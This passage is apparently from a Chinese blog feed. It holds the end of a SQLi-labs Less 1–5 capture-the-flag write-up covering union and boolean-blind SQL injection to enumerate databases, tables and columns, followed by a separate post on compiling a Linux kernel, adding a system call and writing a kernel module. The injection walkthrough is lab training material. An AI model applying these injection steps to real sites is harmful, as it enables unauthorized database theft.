<p>可以看到第一个表为information_schema，修改limit 0,1中0的值，遍历</p>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713162401207.png" class="" title="image-20200713162401207">
<p>最终得到所有的库名。</p>
<p>然后查询数据库中的表名，以security为例</p>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713163201802.png" class="" title="image-20200713163201802">
<p>遍历查询，就得到所有的表名。</p>
<p>然后获取表的字段名，以emails为例</p>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713164353082.png" class="" title="image-20200713164353082">
<p>遍历可以得到emails的所有字段id，email_id</p>
<p>然后获取字段内容</p>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713165034010.png" class="" title="image-20200713165034010">
<p>遍历</p>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713165402331.png" class="" title="image-20200713165402331">
<p>可以看到一共有8条数据</p>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713165624149.png" class="" title="image-20200713165624149">
<p>通过这样我们就可以把整个服务器的数据库down下来。</p>
<p>补充：</p>
<p>我们可以使用group_concat将信息输出到一行，这样更为方便。</p>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713170544482.png" class="" title="image-20200713170544482">
<h1 id="less-2">Less-2</h1>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713171603173.png" class="" title="image-20200713171603173">
<p>注入单引号，根据报错信息可以看出id在sql中是整型</p>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713171622650.png" class="" title="image-20200713171622650">
<p>通过布尔条件测试判断能否注入</p>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713171850699.png" class="" title="image-20200713171850699">
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713171924317.png" class="" title="image-20200713171924317">
<p>得出结论存在注入，使用union注入</p>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713172017996.png" class="" title="image-20200713172017996">
<p>查询数据库名</p>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713172117403.png" class="" title="image-20200713172117403">
<p>注入成功，后续爆库步骤省略。</p>
<h1 id="less-3">Less-3</h1>
<p>单引号测试，查看报错信息</p>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713172910823.png" class="" title="image-20200713172910823">
<p>猜测sql语句形式为</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="operator">*</span> <span class="keyword">WHERE</span> id<span class="operator">=</span>(<span class="string">&#x27;$id&#x27;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>布尔测试</p>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713173111249.png" class="" title="image-20200713173111249">
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713173120963.png" class="" title="image-20200713173120963">
<p>可以注入，注意构造的形式</p>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713173536293.png" class="" title="image-20200713173536293">
<p>爆库</p>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713173648836.png" class="" title="image-20200713173648836">
<h1 id="less-4">Less-4</h1>
<p>双引号测试</p>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713174125565.png" class="" title="image-20200713174125565">
<p>猜测sql语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="operator">*</span> <span class="keyword">WHERE</span> id<span class="operator">=</span>(&quot;$id&quot;) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>布尔测试</p>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713174333657.png" class="" title="image-20200713174333657">
<p>union注入：</p>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713174422863.png" class="" title="image-20200713174422863">
<p>爆库</p>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713174656504.png" class="" title="image-20200713174656504">
<h1 id="less-5">Less-5</h1>
<p>单引号测试</p>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713174921832.png" class="" title="image-20200713174921832">
<p>布尔测试</p>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713174941031.png" class="" title="image-20200713174941031">
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713174949880.png" class="" title="image-20200713174949880">
<p>可以看到存在注入，但是当布尔值为真时页面没有回显，因此考虑布尔注入</p>
<p>首先判断该数据表的字段</p>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713175252435.png" class="" title="image-20200713175252435">
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713175301836.png" class="" title="image-20200713175301836">
<p>可以看到一共有三个字段。</p>
<p>判断数据库名字的长度</p>
<p>使用length()函数</p>
<p>可以看到长度大于等于1</p>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713175615810.png" class="" title="image-20200713175615810">
<p>小于15</p>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713175702619.png" class="" title="image-20200713175702619">
<p>多次测试后发现数据库名长度为8</p>
<p>再按位测试数据库每一位的值</p>
<p>使用substr(str,a,b)函数，a是从第几个字符开始（注意：字符从1开始，不是从0开始），b是每次返回几个字符</p>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713180012852.png" class="" title="image-20200713180012852">
<p>当测试到s时返回真，则数据库名的第一个字符为s</p>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713180044267.png" class="" title="image-20200713180044267">
<p>通过这种方式可以进行爆库。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>OS实验之玩转linux内核</title>
    <url>/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/</url>
    <content><![CDATA[<p>虽然用过linux系统，但是内核却一直没接触过。正好这学期的操作系统有实验课，要玩内核，就通过这门课好好学习一下内核相关的知识。在这里记录一下自己的linux内核学习过程和遇到的各种坑。如果写的有什么问题欢迎各位大佬指正。我会把源代码放到<a
href="https://github.com/winny1001/Operating-System-Experiment">GitHub</a>上，有些代码（例如内存分配）比较长，因此可以直接从GitHub上下载下来，便于阅读。如果这篇博客帮助到你，可以在文章末尾点一个喜欢或者分享给他人，也可以给我的项目点一个star哦~</p>
<h1 id="linux内核的编译初体验">linux内核的编译初体验~</h1>
<p>编译实验第一个题目是要添加一个系统调用。但是不管什么题目，都得重新编译内核，所以首先我得学习如何编译linux内核。</p>
<h2 id="实验环境准备">实验环境准备</h2>
<p>我用的环境是VM Ware + <a
href="https://ubuntu.com/download/server">Ubuntu Server18.04.3
LTS</a>（没有图形化界面，操作方便且占用内存较小）。给的配置为4GB内存，50GB硬盘，4核处理器。</p>
<p>声明：我所有的命令没有特殊说明都是在root用户下执行的，因此没有<code>sudo</code>，如果你在非root用户下执行可能需要<code>sudo</code>。</p>
<p>首先查看当前使用的linux版本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">uname</span> -r</span><br></pre></td></tr></table></figure>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/1570889446612.png" class="" width="1570889446612">
<p>可以看到我初始的版本是4.15.0-66，然后下载你想要的内核，在
https://mirrors.edge.kernel.org/pub/linux/kernel/
上找到你想要的内核并下载，例如我下载的是linux-4.16.10.tar.xz：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.16.10.tar.xz</span><br></pre></td></tr></table></figure>
<p>下载完成后解压到linux-4.16.10文件夹：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar xvJf linux-4.16.10.tar.xz</span><br></pre></td></tr></table></figure>
<p>解压完成后就是修改并编译linux啦。</p>
<h2 id="编译linux内核">编译linux内核</h2>
<p>编译linux内核前首先我们要配置相应的环境。要求至少给虚拟机50G的磁盘空间（没有50G也尽量越多越好），不然编四五个小时最后提示你没有空间了要重新编译那直接原地裂开。</p>
<p>然后安装相应的依赖包和软件工具：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install libncurses5-dev libssl-dev zlibc minizip build-essential openssl libidn11-dev libidn11 </span><br><span class="line">apt-get install git fakeroot ncurses-dev xz-utils bc flex libelf-dev bison</span><br></pre></td></tr></table></figure>
<p>安装完之后<code>cd linux-4.16.10</code>进入文件夹内，如果你是第一次编译，那么使用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>
<p>进行配置，这个命令打开一个配置工具，允许我们定制自己的内核。</p>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/1571221714061.png" class="" width="1571221714061">
<p>如果不是第一次编译，那么首先要清除之前编译产生的中间文件。输入以下指令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make mrproper</span><br></pre></td></tr></table></figure>
<p>mrproper是清除编译过程中产生的所有文件、配置和备份文件（Remove all
generated files + config + various backup files）或者你也可以用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make clean</span><br></pre></td></tr></table></figure>
<p>这是清除编译过程中产生的大多数文件，但会保留内核的配置文件，同时还有足够的编译支持来建立扩展模块（
Remove most generated files but keep the config and enough build support
to build external modules）。</p>
<p>由于是第一次并且是以学习编译为目的，因此我们使用默认配置就好。直接save-&gt;ok-&gt;exit-&gt;exit。</p>
<p>配置完了之后就可以开始编译了</p>
<p>直接输入<code>make</code>就可以开始编译。当然，你可以采用多线程编译，这样速度会快一点。命令是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make -j8</span><br></pre></td></tr></table></figure>
<p><code>-jx</code>中的x是make并行编译的线程数，给多少随意，一般这个数值为内核数*2比较合适，比如说我给了虚拟机4核，那么我就-j8。</p>
<p><strong>但是需要注意的是</strong>：如果你修改了内核，而且不知道对不对，那么最好不要多线程编译。因为如果一个线程出错了的话，编译不会停止，其他线程会继续编译，其他线程编译的内容就会把出错的信息刷掉，这样一来你就无法知道自己编译的是否正确以及出错的位置在哪（血的教训）。</p>
<p>由于是编译整个内核，因此编译时间很长，接下来就是耐心的等待了。</p>
<p>编译过程如图：</p>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/1571218157936.png" class="" width="1571218157936">
<p>编译完成后开始安装之前启用的模块：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make modules_install</span><br></pre></td></tr></table></figure>
<p>安装完成之后接着安装内核：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make install</span><br></pre></td></tr></table></figure>
<p>安装完内核之后我们需要启用编译好的内核，打开<code>/etc/default/grub</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/default/grub</span><br></pre></td></tr></table></figure>
<p>按<code>i</code>进行编辑，找到并注释掉GRUB_TIMEOUT_STYLE=hidden和GRUB_TIMEOUT=0，如图所示：</p>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/1570874109940.png" class="" width="1570874109940">
<p>修改完成后先按<code>esc</code>退出编辑模式，再按<code>:wq</code>保存退出，然后更新配置并重新启动：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update-grub</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>
<p>重启后出现菜单：</p>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/1570874224027.png" class="" width="1570874224027">
<p>直接进入就启用了我们编译好的内核了。如果想要切换内核，就选Advanced
options for Ubuntu，这一栏就可以选择想要使用的内核了：</p>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/1571228835055.png" class="" width="1571228835055">
<h2 id="避免采坑">避免采坑</h2>
<p>正常操作到这就完成了。但是这时候我遇到了问题，我在编译完成之后发现无法使用新内核进入系统，如图：</p>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/1570874893440.png" class="" width="1570874893440">
<p>后来在网上查找发现造成这种错误的一个可能的原因是内存太小，我本来的配置是2GB（我寻思也不小啊），改成4GB之后就能正常启动了。</p>
<p>打开之后用<code>uname -r</code>看看内核版本：</p>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/1571229039863.png" class="" width="1571229039863">
<p>是4.16.10，我们成功了！至此，我们第一个内核就算正是编译完成了，撒花！</p>
<p>下面我们就可以对新鲜出炉的内核动手动脚啦hiahiahia。</p>
<h1 id="设计一个系统调用">设计一个系统调用！</h1>
<p>光会编译内核，还不能算入门，只能算看到了门。真正想要“玩”内核，就必须要学会修改内核，让内核变得更加个性化。一开始我们举一个最简单的例子，也是编译实验原理课的第一个实验，设计一个系统调用！</p>
<h2 id="啥叫系统调用">啥叫系统调用</h2>
<p>系统调用，听着很高大上，但千万不要被它的名字吓到，其实简单理解它就是一内核调用的函数，而不是用户调用的。</p>
<p>维基百科是这样定义的：系统调用（英语：system
call），指运行在用户空间的程序向操作系统内核请求需要更高权限运行的服务。系统调用提供用户程序与操作系统之间的接口。</p>
<p>举个简单的例子，我去别人家做客，我想玩他家的乐低，但是乐高在人家卧室里，我没有权限进去，那咋办嘞？我就给主人说，“我想玩你的乐低，请帮我拿一下。”主人说没问题，起身进去帮我拿了出来，然后我开心的玩起了乐低。这时候，“我”就是用户，“主人”就是内核，而“玩乐低”是需要更高权限运行的服务，“帮我拿乐低”就是一个接口，由于这个动作是“主人”发出的（这个函数是内核调用的），那么这就是一个系统调用。</p>
<h2 id="加入自己的hello-world系统调用">加入自己的Hello
World系统调用</h2>
<p>参考《<a
href="https://blog.csdn.net/qq_41175905/article/details/80529245">操作系统作业：给linux系统增加一个系统调用</a>》。</p>
<p>首先在系统调用表<code>linux-4.16.10/arch/x86/entry/syscalls/syscall_64_tbl</code>中定义自己的系统调用的调用号和系统调用函数的映射。</p>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/1571234059525.png" class="" width="1571234059525">
<p>然后在头文件<code>linux-4.16.10/arch/x86/include/asm/syscalls.h</code>中声明自己的系统调用</p>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/1571234171381.png" class="" width="1571234171381">
<p>然后在把具体调用的实现函数写在linux-4.16.10/kernel/sys.c里：</p>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/1571322664930.png" class="" width="1571322664930">
<p>然后重新编译内核，不要忘了重启。编译好了之后我们写一个测试代码<code>test.c</code>来看看能否成功执行我们的系统调用：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> a = syscall(<span class="number">333</span>);	<span class="comment">//333是我们自己的系统调用的调用号</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;System call sys_helloworld return %ld\n&quot;</span>,a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用<code>gcc -o test test.c</code>来编译，编译完成后用<code>./test</code>来运行：</p>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/1571235696127.png" class="" width="1571235696127">
<p>可以看到输出了22，证明我们的系统调用成功的被执行了！</p>
<p>但是为什么没有“Hello
World!!!”呢？是因为printk函数输出的信息具有日志级别，简单来说就是printk输出的内容输出到了内核日志里，我们可以通过<code>dmesg</code>命令查看内核日志：</p>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/1571239942149.png" class="" width="1571239942149">
<p>可以看到最后一行就是我们输出的信息“Hello
World!!!”，也同样证明我们的系统调用成功实现了！</p>
<p>那如果我们就想让它输出到终端可以吗？也是可以的，这就涉及到printk的知识点了。</p>
<p>内核通过 printk()
输出的信息具有日志级别，内核中共提供了八种不同的日志级别，在
linux/kernel.h 中有相应的宏对应。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> KERN_EMERG   <span class="string">&quot;&lt;0&gt;&quot;</span>   <span class="comment">/* system is unusable */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERN_ALERT   <span class="string">&quot;&lt;1&gt;&quot;</span>   <span class="comment">/* action must be taken immediately */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERN_CRIT   <span class="string">&quot;&lt;2&gt;&quot;</span>   <span class="comment">/* critical conditions */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERN_ERR   <span class="string">&quot;&lt;3&gt;&quot;</span>   <span class="comment">/* error conditions */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERN_WARNING <span class="string">&quot;&lt;4&gt;&quot;</span>   <span class="comment">/* warning conditions */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERN_NOTICE  <span class="string">&quot;&lt;5&gt;&quot;</span>   <span class="comment">/* normal but significant */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERN_INFO   <span class="string">&quot;&lt;6&gt;&quot;</span>   <span class="comment">/* informational */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERN_DEBUG  <span class="string">&quot;&lt;7&gt;&quot;</span>   <span class="comment">/* debug-level messages */</span></span></span><br></pre></td></tr></table></figure>
<p>未指定日志级别的 printk() 采用的默认级别是
DEFAULT_MESSAGE_LOGLEVEL，这个宏在 kernel/printk.c 中被定义为整数
4，即对应KERN_WARNING。</p>
<p><strong>当printk中指定的级别（级别越小优先级越高）小于当前控制台日志级别时，printk的信息就会在控制台上显示。</strong></p>
<p>所以如果我们想把Hello
World打印到控制台上，可以在输出的文本前加上<code>KERN_ALERT</code>（其他也可以只要优先级大于控制台日志级别）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">printk(KERN_ALERT <span class="string">&quot;Hello World!\n&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>但是这种方法要求每次输出前都要加上，比较麻烦。还有一种一劳永逸的方法，输入以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 4 3 &gt; /proc/sys/kernel/printk</span><br></pre></td></tr></table></figure>
<p>如果你不是root用户，那么使用如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 4 3 | sudo <span class="built_in">dd</span> of=/proc/sys/kernel/printk</span><br></pre></td></tr></table></figure>
<p>在 <code>/proc/sys/kernel/printk</code>中会显示4个数值（可由 echo
修改），分别表示：</p>
<ul>
<li>当前控制台日志级别；</li>
<li>未明确指定日志级别的默认消息日志级别；</li>
<li>最小（最高）允许设置的控制台日志级别；</li>
<li>引导时默认的日志级别；</li>
</ul>
<p>上述命令就将默认消息日志级别改为了3，而控制台日志级别为4，这样就可以输出到屏幕了。</p>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/1571273096443.png" class="" width="1571273096443">
<p><strong>注意</strong>：修改用echo修改，不能用vim（但好像个别可以），否则会报Fsync
failed错。因为vim编辑文件是首先创建该文件的一个副本，当保存的时候就用这个副本替换掉原文件。而proc文件系统下的文件并不是真的文件，都是内存中的影像，因此不支持这种编辑方式，所以不能用vim。</p>
<h2 id="避免采坑-1">避免采坑</h2>
<p>我的实验是基于4.16.10版本的。内核版本不同，系统调用的修改可能也略有不同。</p>
<p>缩进最好使用tab键（就是键盘q左边的那个），不要用空格，否则可能有不可预料的错误。</p>
<h1 id="设计一个动态调用模块">设计一个动态调用模块！</h1>
<p>相信很多初学者和我一样，每次修改一下系统调用就要重新编译整个内核，这样做既耗费时间，效率也非常非常低。所以我们现在来一起学习一下动态模块，这样以后我们想加什么功能就直接以动态模块的形式加入到内核，修改之后只用编译我们这个模块就行了。</p>
<h2 id="啥叫动态模块">啥叫动态模块</h2>
<p>维基百科是这样定义的：可加载内核模块（英语：Loadable kernel
module，缩写为
LKM）,又译为加载式核心模块、可装载模块、可加载内核模块，或直接称为内核模块，是一种目标文件（object
file），在其中包含了能在操作系统内核空间运行的代码。它们运行在核心基底（base
kernel），通常是用来支持新的硬件，新的文件系统，或是新增的系统调用（system
calls）。当不需要时，它们也能从存储器中被卸载，清出可用的存储器空间。</p>
<p>由于
Linux属于单内核，单内核扩展性与维护性都很差（大家编译了这么多次内核应该已经深有体会），所以就引入了这么个动态模块，这样一来就大大方便我们添加和修改自己想要的功能。一般动态模块主要是用来写驱动的。</p>
<h2 id="加入自己的hello-module动态模块">加入自己的Hello
Module动态模块</h2>
<p>那么废话少说，现在就让我们来写一个动态模块吧。</p>
<p>首先<code>mkdir mod_hello</code>新建一个文件夹，然后在里面创建我们的动态模块源码mod_a.c：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//mod_a.c</span></span><br><span class="line"><span class="comment">//动态模块必须要的三个头文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">init_mymod</span><span class="params">(<span class="type">void</span>)</span>	<span class="comment">//声明是一个模块以及加载时初始化的动作</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(<span class="string">&quot;Hello Module!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">exit_mymod</span><span class="params">(<span class="type">void</span>)</span>	<span class="comment">//卸载模块时的动作</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(<span class="string">&quot;Goodbye Module!\n:&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(init_mymod); </span><br><span class="line">module_exit(exit_mymod);</span><br><span class="line"></span><br><span class="line"><span class="comment">//声明模块相关的信息，第一条声明模块的许可证是必要的，2.4.10之后的版本必须声明</span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;WPX&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>现在我们就写好了一个模块。这个模块的功能就是在安装的时候输出“Hello
Module!”，卸载的时候输出“Goodbye Module!”。下面我们开始写Makefile：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">CONFIG_MODULE_SIG=n</span><br><span class="line"></span><br><span class="line"><span class="keyword">ifneq</span> (<span class="variable">$(KERNELRELEASE)</span>,)</span><br><span class="line">        obj-m :=mod_a.o</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        KERNELDIR := /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build</span><br><span class="line">PWD := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"><span class="section">modules:</span></span><br><span class="line">        <span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDIR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">        <span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDIR)</span> M=<span class="variable">$(PWD)</span> clean</span><br><span class="line"><span class="keyword">endif</span></span><br></pre></td></tr></table></figure>
<p>关于Makefile的语法这里就不细讲了，有兴趣的同学可以自己学习一下，不难。写好了之后就可以<code>make</code>编译啦：</p>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/1571292905251.png" class="" width="1571292905251">
<p>生成<code>mod_a.ko</code>文件就说明成功啦。下面就是如何装载和卸载模块了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">insmod mod_a.ko	//装载模块</span><br><span class="line"></span><br><span class="line">rmmod mod_a	//卸载模块</span><br></pre></td></tr></table></figure>
<p>装载模块之后我们可以通过<code>lsmod</code>查看系统已装载的模块：</p>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/1571293144531.png" class="" width="1571293144531">
<p>可以看到我们的模块已经加载到了系统中。现在看看系统日志测试一下我们的语句有没有输出：</p>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/1571322903655.png" class="" width="1571322903655">
<p>可以看到已经成功输出了，说明我们成功的完成了动态模块的加载！</p>
<p>如果你在加载模块的时候出现以下错误：</p>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/1571294764926.png" class="" width="1571294764926">
<p>那是因为你之前已经装载过了该模块，所以先卸载这个模块再重新装载就可以了。</p>
<h2 id="避免采坑-2">避免采坑</h2>
<h3 id="模块签名">模块签名</h3>
<p>我刚开始测试的时候，发现日志中报错，然后没有输出：</p>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/1571290497284.png" class="" width="1571290497284">
<p>这个报错是因为在3.7版本后内核有了模块签名机制，如果模块没有签名在加载的时候就会报这个错。这个有两种解决办法，一种是给模块签名，一种是关掉签名检查机制。这里给出第二种。</p>
<p>关掉签名检查机制一种说法是在Makefile的开头加上<code>CONFIG_MODULE_SIG=n</code>，但是在我测试的时候发现好像没啥用。第二种方法是直接修改内核配置文件，在<code>make menuconfig</code>后修改<code>linux-4.16.10/.config</code>（这是一个隐藏文件）:</p>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/1571324205319.png" class="" width="1571324205319">
<p>将CONFIG_MODULE_SIG=y、CONFIG_MODULE_SIG_ALL=y和CONFIG_MODULE_SIG_SHA512=y的y都改成n，然后重新编译内核，经过测试这种方法可以解决问题。</p>
<p>但是经过测试我发现这个签名的报错好像也没什么影响，还是可以正常的输出“Hello
Module!”……有点迷，不是很懂。</p>
<h3 id="section">！！！</h3>
<p>在我还没有解决上面报错的问题时，我又发现一个很奇怪的现象：</p>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/1571320179038.png" class="" width="1571320179038">
<p>我加载内核的时候输出的是Goodbye我卸载内核的时候输出的是Hello。</p>
